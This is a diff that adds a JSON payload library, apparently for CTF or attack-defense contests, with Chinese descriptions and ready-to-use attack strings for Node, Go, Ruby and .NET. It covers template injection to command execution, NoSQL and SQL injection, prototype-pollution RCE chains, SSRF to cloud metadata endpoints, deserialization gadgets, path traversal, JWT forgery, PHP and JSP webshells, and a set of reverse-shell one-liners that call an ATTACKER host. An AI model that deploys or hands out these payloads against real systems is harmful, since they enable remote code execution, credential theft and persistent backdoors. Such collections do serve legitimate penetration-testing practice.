@@ -1,0 +1,148 @@
+{
+  "payloads": [
+    {
+      "id": "payload-node-ssti-handlebars",
+      "title": "Node SSTI: EJS / Handlebars / Pug",
+      "language": "nodejs",
+      "category": "ssti",
+      "description": "EJS 的 <%= %> 直接执行 JS；Handlebars 靠原型上的 constructor 摸到 process。",
+      "body": "# EJS\n<%= 7*7 %>\n<%= global.process.mainModule.require('child_process').execSync('id') %>\n<%= require('child_process').execSync('id').toString() %>\n# Handlebars\n{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}\n# Pug / Jade\n#{global.process.mainModule.require('child_process').execSync('id')}\n# 探测\n{{7*7}}  #{7*7}  ${7*7}"
+    },
+    {
+      "id": "payload-node-nosqli-blind",
+      "title": "Node NoSQL 注入: Mongo 操作符与盲注",
+      "language": "nodejs",
+      "category": "nosqli",
+      "description": "Express + Mongoose 里未校验对象类型就能塞 $ne/$regex；$where 可跑 JS。",
+      "body": "{\"username\":\"admin\",\"password\":{\"$ne\":null}}\n{\"username\":{\"$regex\":\"^a\"},\"password\":{\"$ne\":\"x\"}}\n{\"username\":\"admin\",\"password\":{\"$gt\":\"\"}}\n# URL 编码形式\nusername[$ne]=x&password[$ne]=x\nusername[$regex]=^adm&password[$gt]=\n# 盲注（正则逐位）\n{\"$where\":\"this.password.match(/^a/)!=null\"}\n{\"$where\":\"sleep(3000)||true\"}\n# 数组绕过\nusername=admin&password[$in][]=1\n# 原型污染配合\n{\"__proto__\":{\"$ne\":1}}"
+    },
+    {
+      "id": "payload-node-proto-chain",
+      "title": "Node 原型污染 → RCE 链",
+      "language": "nodejs",
+      "category": "prototype-pollution",
+      "description": "单纯污染只是改属性，配合 child_process / ejs / lodash.template 才能到 RCE。",
+      "body": "# 1) 污染入口\n{\"__proto__\":{\"polluted\":\"yes\"}}\n{\"constructor\":{\"prototype\":{\"polluted\":\"yes\"}}}\n# 2) 检测\n{}.polluted\n# 3) 打 child_process（NODE_OPTIONS 注入）\n{\"__proto__\":{\"shell\":\"node\",\"argv0\":\"console.log(require('child_process').execSync('id').toString())//\",\"NODE_OPTIONS\":\"--require /proc/self/cmdline\"}}\n{\"__proto__\":{\"env\":{\"EVIL\":\"console.log(process.mainModule.require('child_process').execSync('id').toString())//\"},\"shell\":\"/proc/self/exe\",\"argv0\":\"console\"}}\n# 4) 打 ejs\n{\"__proto__\":{\"client\":true,\"escapeFunction\":\"1;return global.process.mainModule.require('child_process').execSync('id');\"}}\n# 5) 打 lodash.template\n{\"__proto__\":{\"source\":\"<%= global.process.mainModule.require('child_process').execSync('id') %>\"}}"
+    },
+    {
+      "id": "payload-node-ssrf-gopher",
+      "title": "Node SSRF: 内网与元数据",
+      "language": "nodejs",
+      "category": "ssrf",
+      "description": "Node 的 http 模块不支持 gopher，但 axios 走 http 时能访问内网任意 HTTP 服务。",
+      "body": "http://169.254.169.254/latest/meta-data/\nhttp://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\nhttp://100.100.100.200/latest/meta-data/\nhttp://127.0.0.1:2375/containers/json        # Docker API\nhttp://127.0.0.1:8500/v1/catalog/services    # Consul\nhttp://127.0.0.1:6379/  （用 http 打不了，改 CRLF 注入）\n# 绕过 host 校验\nhttp://127.0.0.1@ATTACKER/\nhttp://ATTACKER#@127.0.0.1/\nhttp://127.0.0.1:80\\@ATTACKER/\n# 302 跳转绕过（自己起服务返回 Location: http://127.0.0.1:6379）"
+    },
+    {
+      "id": "payload-node-deser-node-serialize",
+      "title": "Node 反序列化: node-serialize / funcster",
+      "language": "nodejs",
+      "category": "deserialization",
+      "description": "node-serialize 的 unserialize 会执行 _$$ND_FUNC$$_ 包裹的函数体。",
+      "body": "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(e,o){console.log(o)});}()\"}\n# 变体（立即执行必须带 ()）\n{\"rce\":\"_$$ND_FUNC$$_function(){return require('child_process').execSync('id').toString()}()\"}\n# funcster / cryo 同源问题\n# 入口：cookie（profile=）、session、缓存、socket.io 消息、Electron IPC"
+    },
+    {
+      "id": "payload-node-path-traversal",
+      "title": "Node 路径穿越与 zip slip",
+      "language": "nodejs",
+      "category": "lfi",
+      "description": "res.sendFile / fs.readFile 拼接时用绝对路径或 ../；path.join 会规范化但 path.resolve 不会拦绝对路径。",
+      "body": "?file=../../../../etc/passwd\n?file=/etc/passwd\n?file=..%2f..%2f..%2fetc%2fpasswd\n?file=....//....//etc/passwd\n# 绕过 path.normalize 检查（先 normalize 再拼接的写法）\n?file=../../etc/passwd%00.png\n# zip slip（adm-zip / unzipper / tar）\n压缩包内条目名 ../../../../var/www/html/x.js\n# 常见点：res.download(userPath)、fs.createReadStream、serve-static 老版本"
+    },
+    {
+      "id": "payload-node-sql-sequelize",
+      "title": "Node SQL 注入: Sequelize / Knex",
+      "language": "nodejs",
+      "category": "sqli",
+      "description": "Sequelize 的 where 传字符串直接拼接；Op 操作符可控时也能越权查询。",
+      "body": "' or 1=1-- \n' union select 1,2,3-- \n# Sequelize where 字符串拼接\n?name=' OR 1=1--\n# Op 注入\n?status[$ne]=1\n?role[$in][]=admin\n# order by 注入\n?sort=id,(select 1 from (select sleep(3))a)\n# limit 注入\n?limit=1;select sleep(3)"
+    },
+    {
+      "id": "payload-node-jwt-jku",
+      "title": "Node JWT: jku / x5u / kid 注入",
+      "language": "nodejs",
+      "category": "jwt",
+      "description": "jsonwebtoken 老版本不校验 jku；kid 可注入路径或 SQL。",
+      "body": "# 1) alg=none\n{\"alg\":\"none\",\"typ\":\"JWT\"}\n# 2) jku 指向自己的 JWKS\n{\"alg\":\"RS256\",\"jku\":\"http://ATTACKER/jwks.json\",\"kid\":\"k1\"}\n# 3) x5u\n{\"alg\":\"RS256\",\"x5u\":\"http://ATTACKER/cert.pem\"}\n# 4) kid 路径穿越（密钥读文件）\n{\"alg\":\"HS256\",\"kid\":\"../../../../dev/null\"}\n# 5) kid SQL 注入\n{\"alg\":\"HS256\",\"kid\":\"x' union select 'secret'-- -\"}\n# 6) HS256 用公钥当密钥\njwt.sign({user:'admin'}, publicKey, {algorithm:'HS256'})"
+    },
+    {
+      "id": "payload-go-ssti-html",
+      "title": "Go 模板注入: text/template",
+      "language": "go",
+      "category": "ssti",
+      "description": "html/template 会转义，text/template 不转义；能控模板内容时可直接调函数。",
+      "body": "{{.}}\n{{printf \"%s\" .}}\n{{.Password}}\n# text/template 可调用导出方法\n{{.ReadFile \"/etc/passwd\"}}\n{{.Exec \"id\"}}\n# 探测\n{{7*7}}  →  49 表示模板被执行（非变量替换）\n# 入口：邮件模板、报表模板、Prometheus 配置、Hugo 主题"
+    },
+    {
+      "id": "payload-go-sql-gorm",
+      "title": "Go SQL 注入: GORM / database/sql",
+      "language": "go",
+      "category": "sqli",
+      "description": "db.Raw / db.Exec 拼接、Order(userInput)、Where(fmt.Sprintf) 都是注入点。",
+      "body": "' or 1=1-- \n' union select 1,2,3-- \n# Order 注入\n?sort=id;select pg_sleep(3)\n# 时间盲注（PG）\n' and 1=(select 1 from pg_sleep(3))--\n# MySQL\n' and sleep(3)-- \n# 常见点\ndb.Raw(\"select * from u where name='\" + name + \"'\")\ndb.Order(param).Find(&u)\ndb.Where(fmt.Sprintf(\"id=%s\", id))"
+    },
+    {
+      "id": "payload-go-ssrf",
+      "title": "Go SSRF: http.Client 任意协议",
+      "language": "go",
+      "category": "ssrf",
+      "description": "Go 的 http.Client 支持 http/https，加上自定义 Transport 可打 unix socket。",
+      "body": "http://169.254.169.254/latest/meta-data/\nhttp://127.0.0.1:2375/version\nhttp://127.0.0.1:8080/actuator/env\nfile:///etc/passwd        （需 url.Parse + os.Open 路径）\n# 绕过校验\nhttp://127.0.0.1:80@ATTACKER/\nhttp://0x7f000001/\nhttp://[::ffff:127.0.0.1]/\n# 302 跳转"
+    },
+    {
+      "id": "payload-go-file-write",
+      "title": "Go 任意文件写入 → webshell",
+      "language": "go",
+      "category": "upload",
+      "description": "os.Create / ioutil.WriteFile 可控路径时可直写；注意 Go 服务多为静态二进制，权限常为 nobody。",
+      "body": "/../../../../var/www/html/x.php\n/../../../../tmp/x.jsp\n# 内容\n<?php @eval($_POST[1]);?>\n<% Runtime.getRuntime().exec(request.getParameter(\"c\")); %>\n# 覆盖配置提权（AWD 常用）\n../config/database.php\n../.env\n# 若无写权限：写 /tmp 后包含、或改 crontab"
+    },
+    {
+      "id": "payload-go-archive-slip-2",
+      "title": "Go 压缩包路径穿越: tar/zip slip",
+      "language": "go",
+      "category": "archive-slip",
+      "description": "archive/tar 与 archive/zip 不校验条目名，直接 filepath.Join 就会写到目标目录外。",
+      "body": "# tar 条目名\n../../../../var/www/html/x.php\n..\\..\\..\\..\\windows\\temp\\x.aspx\n# 绝对路径条目\n/etc/cron.d/x\n# 符号链接穿越（先建软链再写）\nlink -> /var/www/html\nlink/x.php\n# 生成\npython3 -c \"import tarfile,io;t=tarfile.open('x.tar','w');i=tarfile.TarInfo('../../var/www/html/x.php');d=b'<?php eval(\\$_POST[1]);?>';i.size=len(d);t.addfile(i,io.BytesIO(d));t.close()\""
+    },
+    {
+      "id": "payload-go-jwt",
+      "title": "Go JWT: golang-jwt 算法混淆",
+      "language": "go",
+      "category": "jwt",
+      "description": "golang-jwt v3 及以前 Keyfunc 不校验 alg，可用 none 或 HS256 混淆。",
+      "body": "# 1) none\n{\"alg\":\"none\",\"typ\":\"JWT\"}  +  {\"user\":\"admin\"}\n# 2) HS256 + 公钥\ntoken.SignedString([]byte(publicKeyPEM))\n# 3) 弱密钥\nhashcat -m 16500 jwt.txt rockyou.txt\n# 4) kid 注入\n{\"alg\":\"HS256\",\"kid\":\"../../../../dev/null\"}"
+    },
+    {
+      "id": "payload-ruby-erb",
+      "title": "Ruby SSTI / 代码执行: ERB",
+      "language": "ruby",
+      "category": "ssti",
+      "description": "ERB 的 <%= %> 直接执行 Ruby；Rails 里 render inline: params[:x] 是高危写法。",
+      "body": "<%= 7*7 %>\n<%= system('id') %>\n<%= `id` %>\n<%= IO.popen('id').read %>\n<%= File.read('/etc/passwd') %>\n# 探测\n<%= 7*7 %>  →  49\n# 入口：render inline:、ERB.new(user_input).result、Slim/Haml 动态模板"
+    },
+    {
+      "id": "payload-ruby-yaml",
+      "title": "Ruby 反序列化: YAML.load / Marshal",
+      "language": "ruby",
+      "category": "deserialization",
+      "description": "Ruby < 3.1 的 YAML.load 等同 unsafe_load；Marshal.load 只要能被控就是 RCE。",
+      "body": "--- !ruby/object:Gem::Requirement\nrequirements:\n  !ruby/object:Gem::Installer\n    i: x\n# 通用 gadget（Psych < 4）\n--- !ruby/object:Gem::Installer\ni: x\n--- !ruby/object:Gem::SpecFetcher\ni: y\n--- !ruby/object:Gem::Requirement\nrequirements:\n  !ruby/object:Gem::Package::TarReader\n  io: &1 !ruby/object:Net::BufferedIO\n    io: &1 !ruby/object:Gem::Package::TarReader::Entry\n       read: 0\n       header: \"abc\"\n# Marshal\nMarshal.load(Base64.decode64(cookie))"
+    },
+    {
+      "id": "payload-csharp-viewstate",
+      "title": "C#/.NET 反序列化: ViewState / BinaryFormatter",
+      "language": "csharp",
+      "category": "deserialization",
+      "description": "ViewState 无 MAC 时可用 ysoserial.net 直打；BinaryFormatter 更是通杀。",
+      "body": "ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"cmd /c whoami\" --path=\"/default.aspx\" --apppath=\"/\" --decryptionalg=\"AES\" --decryptionkey=\"...\" --validationalg=\"SHA1\" --validationkey=\"...\"\nysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c \"cmd /c whoami\" -o base64\nysoserial.exe -g ObjectDataProvider -f DataContractSerializer -c \"cmd /c whoami\"\n# 探测 ViewState MAC 是否关闭\n__VIEWSTATE=AAAA  →  报 MAC 校验失败 = 开启；报格式错误 = 关闭\n# 常见入口：ASP.NET ViewState、.NET Remoting、WCF、Session、Cookie"
+    },
+    {
+      "id": "payload-shell-reverse",
+      "title": "Shell 反弹合集（含无 nc 环境）",
+      "language": "shell",
+      "category": "rce",
+      "description": "AWD 靶机常无 nc/python，多准备几条，注意出网方向可能只有 80/443。",
+      "body": "bash -i >& /dev/tcp/ATTACKER/4444 0>&1\nbash -c 'exec 5<>/dev/tcp/ATTACKER/443;cat <&5|while read l;do $l 2>&5;done'\nnc ATTACKER 4444 -e /bin/sh\nrm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f\npython3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER\",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'\nperl -e 'use Socket;$i=\"ATTACKER\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:4444"
+    }
+  ]
+}
